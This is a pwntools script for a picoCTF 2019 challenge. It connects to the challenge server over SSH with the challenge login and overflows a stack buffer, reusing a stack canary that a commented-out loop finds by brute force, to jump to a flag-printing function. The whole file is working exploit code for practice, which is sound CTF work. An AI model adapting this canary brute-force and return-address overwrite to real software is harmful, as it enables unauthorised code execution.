from pwn import *

session = ssh(host="2019shell1.picoctf.com", user="cse331", password="3curityishard", level=50)

addressOfFlagFxn = b'\xed\x07\x00\x00'
addr = "000007ed"

canary = 'LjgH'
# for length in range(33, 37):
#     for i in range(0, 256):
#         program = session.process(['./vuln'], cwd='/problems/canary_4_221260def5087dde9326fb0649b434a7')
#         program.recvline()
#         program.recv()
#         program.sendline(str(length))
#         program.recv()
#         program.sendline('a' * 32 + canary + chr(i))
#         output = program.recvline()
#         if b'Canary' not in output:
#             print(output)
#             canary += chr(i)
#             break

random_str = cyclic(200)
setStr = random_str.decode("utf-8")
payload = 'a' * 32 + canary + 'a' * 16 + addr
check = str(len(payload))
print(check)

program = session.process(['./vuln'], cwd='/problems/canary_4_221260def5087dde9326fb0649b434a7')
program.recvline()
program.recv()
program.sendline(str(len(payload)))
program.recv()
program.sendline(payload)
print(program.recvall())
